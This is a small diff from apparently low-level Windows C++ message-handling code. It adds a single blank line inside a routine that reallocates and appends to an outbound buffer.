@@ -182,6 +182,7 @@ namespace Message {
                     } else {
                         Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
                         x_memcpy(Outbound->Buffer + Outbound->Length, Head->Buffer, Head->Length);
+
                         Outbound->Length += Head->Length;
                     }
 
